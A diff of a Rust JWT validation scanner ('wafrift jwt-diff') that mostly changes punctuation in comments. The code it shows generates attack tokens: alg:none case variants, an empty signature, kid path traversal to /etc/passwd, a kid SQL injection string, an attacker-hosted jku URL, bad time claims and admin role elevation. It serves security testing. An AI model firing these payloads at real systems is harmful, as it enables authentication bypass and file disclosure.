@@ -1,22 +1,22 @@
-//! `wafrift jwt-diff` — JWT signature / claim validation scanner.
+//! `wafrift jwt-diff`: JWT signature / claim validation scanner.
 //!
 //! ## What this finds
 //!
 //! Many APIs that use JWT tokens have validation bugs:
 //!
-//! - **`alg:none`** — server skips signature validation when the
+//! - **`alg:none`**: server skips signature validation when the
 //!   header declares `"alg":"none"`. Trivial bypass.
-//! - **Algorithm-case confusion** — `"alg":"None"` or `"NONE"` or
+//! - **Algorithm-case confusion**: `"alg":"None"` or `"NONE"` or
 //!   `"nOnE"`; libraries that case-match strictly accept the variant.
-//! - **Empty signature on HS256** — server logs alg:HS256 but skips
+//! - **Empty signature on HS256**: server logs alg:HS256 but skips
 //!   sig check when the signature segment is empty.
-//! - **Expired exp / future nbf accepted** — server doesn't actually
+//! - **Expired exp / future nbf accepted**: server doesn't actually
 //!   validate the time claims.
-//! - **`kid` traversal** — server uses `kid` as a path to look up
+//! - **`kid` traversal**: server uses `kid` as a path to look up
 //!   keys, allowing `../../etc/passwd` or arbitrary file read.
-//! - **`kid` SQL injection** — server uses `kid` in a DB lookup
+//! - **`kid` SQL injection**: server uses `kid` in a DB lookup
 //!   without parameterisation.
-//! - **`jku`/`x5u` attacker-controlled URL** — server fetches the
+//! - **`jku`/`x5u` attacker-controlled URL**: server fetches the
 //!   key from the URL in the header; attacker hosts a malicious
 //!   JWK set.
 //!
@@ -44,11 +44,11 @@ use crate::parser_diff_common::{body_delta_pct, severity_of};
 
 #[derive(Args, Debug)]
 pub(crate) struct JwtDiffArgs {
-    /// Target URL — the protected resource that requires the JWT
+    /// Target URL, the protected resource that requires the JWT
     /// in its `Authorization: Bearer <jwt>` header.
     pub url: String,
 
-    /// KNOWN-valid JWT — the baseline that the server is expected
+    /// KNOWN-valid JWT, the baseline that the server is expected
     /// to accept. Each probe mutates THIS token. Typically the
     /// operator just logged in and captured the token from their
     /// browser / curl.
@@ -83,7 +83,7 @@ pub(crate) struct JwtDiffArgs {
     /// HTTP method to use for both baseline + probes. JWT-protected
     /// endpoints are commonly POST (GraphQL mutations, REST writes);
     /// the GET default was silently returning 405/404 on those and
-    /// the diff falsely reported "no divergence" — not because the
+    /// the diff falsely reported "no divergence", not because the
     /// server validated the JWT correctly, but because every probe
     /// was the wrong shape. Accepts any HTTP method name.
     #[arg(long, default_value = "GET", value_name = "METHOD")]
@@ -132,7 +132,7 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     let mut out = Vec::new();
     let parts: Vec<&str> = baseline.split('.').collect();
     if parts.len() != 3 {
-        // Not a JWT — return an empty set; the runner will detect
+        // Not a JWT, return an empty set; the runner will detect
         // this and surface an error rather than fire garbage probes.
         return out;
     }
@@ -143,31 +143,31 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── alg:none family ──
     out.push(JwtProbe {
         kind: "alg-none-lowercase",
-        description: "alg:`none` — strips signature; server that skips sig check on \
+        description: "alg:`none`: strips signature; server that skips sig check on \
              alg:none accepts a freely-modified payload",
         mutated_token: build_jwt(&with_alg(&header, "none"), &payload, ""),
     });
     out.push(JwtProbe {
         kind: "alg-none-capital",
-        description: "alg:`None` — case-fold confusion; libraries that string-compare \
+        description: "alg:`None`: case-fold confusion; libraries that string-compare \
              alg case-sensitively reject lowercase but accept the variant",
         mutated_token: build_jwt(&with_alg(&header, "None"), &payload, ""),
     });
     out.push(JwtProbe {
         kind: "alg-none-allcaps",
-        description: "alg:`NONE` — third case variant",
+        description: "alg:`NONE`: third case variant",
         mutated_token: build_jwt(&with_alg(&header, "NONE"), &payload, ""),
     });
     out.push(JwtProbe {
         kind: "alg-none-mixed",
-        description: "alg:`nOnE` — mixed case (alternating)",
+        description: "alg:`nOnE`: mixed case (alternating)",
         mutated_token: build_jwt(&with_alg(&header, "nOnE"), &payload, ""),
     });
 
     // ── Empty signature with original alg preserved ──
     out.push(JwtProbe {
         kind: "empty-sig-original-alg",
-        description: "alg preserved (e.g. HS256) but signature segment is empty — \
+        description: "alg preserved (e.g. HS256) but signature segment is empty. \
              servers that look only at header.alg before verifying sig may \
              accept",
         mutated_token: build_jwt(&header, &payload, ""),
@@ -176,7 +176,7 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── kid traversal ──
     out.push(JwtProbe {
         kind: "kid-path-traversal",
-        description: "`kid` header field set to `../../../etc/passwd` — servers that \
+        description: "`kid` header field set to `../../../etc/passwd`: servers that \
              use kid as a path to look up keys may read arbitrary files",
         mutated_token: build_jwt(
             &with_field(&header, "kid", json!("../../../etc/passwd")),
@@ -186,7 +186,7 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     });
     out.push(JwtProbe {
         kind: "kid-sql-injection",
-        description: "`kid` SQL-payload — servers that look up kid in a DB without \
+        description: "`kid` SQL-payload, servers that look up kid in a DB without \
              parameterisation are vulnerable",
         mutated_token: build_jwt(
             &with_field(&header, "kid", json!("x' UNION SELECT 'secret'--")),
@@ -198,7 +198,7 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── jku / x5u attacker-URL ──
     out.push(JwtProbe {
         kind: "jku-attacker-url",
-        description: "`jku` header set to attacker-hosted JWK set URL — servers that \
+        description: "`jku` header set to attacker-hosted JWK set URL, servers that \
              fetch keys from operator-controlled URLs accept attacker-signed \
              tokens",
         mutated_token: build_jwt(
@@ -211,7 +211,7 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Expired exp ──
     out.push(JwtProbe {
         kind: "expired-exp",
-        description: "`exp` claim set to a date 10 years in the past — servers that \
+        description: "`exp` claim set to a date 10 years in the past, servers that \
              don't validate exp accept stale tokens forever",
         mutated_token: build_jwt(
             &header,
@@ -223,7 +223,7 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Future nbf ──
     out.push(JwtProbe {
         kind: "future-nbf",
-        description: "`nbf` (not-before) claim set to far future — servers that don't \
+        description: "`nbf` (not-before) claim set to far future, servers that don't \
              validate nbf accept tokens that 'aren't valid yet'",
         mutated_token: build_jwt(
             &header,
@@ -236,7 +236,7 @@ pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     out.push(JwtProbe {
         kind: "role-elevation",
         description: "Set common admin fields (`role:admin`, `is_admin:true`, \
-             `permissions:[\"*\"]`) in the payload — servers that don't \
+             `permissions:[\"*\"]`) in the payload, servers that don't \
              validate sig let the elevated token through",
         mutated_token: {
             let elevated = with_field(&payload, "role", json!("admin"));
@@ -442,7 +442,7 @@ fn emit_output(
     for r in results.iter().filter(|r| r.severity != "none") {
         let badge = crate::parser_diff_common::severity_badge(r.severity);
         println!();
-        println!("  [{badge}] {} — {}", r.kind.bold(), r.description);
+        println!("  [{badge}] {}: {}", r.kind.bold(), r.description);
         crate::parser_diff_common::print_baseline_probe_arrow(
             r.baseline_status,
             r.baseline_body_len,
@@ -458,7 +458,7 @@ fn emit_output(
 //
 // b64url_encode / b64url_decode / decode_b64url_json are the
 // canonical primitives from wafrift_transport::jwt (RFC 7515 §2).
-// They are imported above — do NOT re-implement here.
+// They are imported above (do NOT re-implement here).
 
 fn build_jwt(header: &Value, payload: &Value, sig: &str) -> String {
     let h = b64url_encode(serde_json::to_string(header).unwrap_or_default().as_bytes());
